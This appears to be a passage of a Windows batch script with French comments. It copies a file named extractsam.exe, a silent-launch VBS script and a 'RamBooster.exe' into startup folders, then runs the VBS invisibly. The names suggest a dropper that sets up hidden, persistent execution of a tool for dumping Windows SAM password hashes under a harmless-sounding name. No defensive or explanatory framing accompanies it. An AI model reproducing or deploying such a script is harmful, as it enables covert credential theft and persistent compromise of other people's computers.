...
copy RunInvisible.vbs "%TARGET2_STARTUP%"
copy extractsam.exe "%TARGET2_STARTUP%"

:: Copier RamBooster.exe dans le bon dossier de démarrage
copy RamBooster.exe "%TARGET_STARTUP%"

:: Lance le script VBS en silencieux
wscript.exe "%TARGET_STARTUP%\RunInvisible.vbs"
